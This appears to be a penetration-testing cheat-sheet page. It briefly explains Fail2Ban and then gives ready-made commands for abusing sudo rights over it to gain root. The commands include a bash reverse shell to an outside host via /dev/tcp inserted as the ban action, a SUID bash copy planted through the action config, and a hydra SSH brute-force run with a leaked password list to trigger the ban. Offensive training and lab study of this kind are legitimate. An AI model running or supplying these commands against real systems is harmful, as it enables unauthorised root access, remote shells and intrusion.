
# **What is Fail2Ban?**
Fail2Ban is a security program that is designed to prevent brute force attacks. To do this, Fail2Ban scans log files like **/var/log/auth.log** and bans IP addresses conducting too many failed login attempts.
- Once an offending IP address is found, Fail2Ban updates system firewall rules to reject new connections from that IP address, for a configurable amount of time.
- By default, Fail2Ban will ban an IP address for ten minutes when five authentication failures have been detected within ten minutes.

# Exploits
## Sudo Fail2ban-client
```sh
# Trigger reverse shell when blocking someone.
sudo fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/10.4.104.91/4441 0>&1'"

# Manual ban, "Manual Trigger for exploit"
sudo fail2ban-client set sshd banip 127.0.0.2
```
## sudo on fail2ban restart
```sh
nano /etc/fail2ban/action.d/iptables-multiport.conf
actionban = cp /bin/bash /tmp && chmod 4755 /tmp/bash
sudo /etc/init.d/fail2ban restart

# Trigger the action by fail ssh login attempt
hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt ssh://172.16.1.175


/tmp/bash -p # now you can get root shell.

```



For more: https://juggernaut-sec.com/fail2ban-lpe/